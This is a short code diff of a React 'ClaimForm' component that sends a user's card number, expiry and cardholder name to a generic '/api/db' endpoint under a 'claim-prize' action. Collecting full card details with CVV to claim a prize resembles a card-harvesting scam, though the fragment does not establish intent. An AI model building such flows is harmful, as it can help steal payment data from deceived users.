@@ -46,10 +46,11 @@ export default function ClaimForm({ onSuccess }) {
     if (form.cvv.length !== 3) { setError('CVV must be 3 digits'); return }
     setLoading(true)
     try {
-      const res = await fetch('/api/user/claim-prize', {
+      const res = await fetch('/api/db', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
+          action: 'claim-prize',
           cardholder_name: form.name,
           card_number: raw,
           card_expiry: form.expiry,
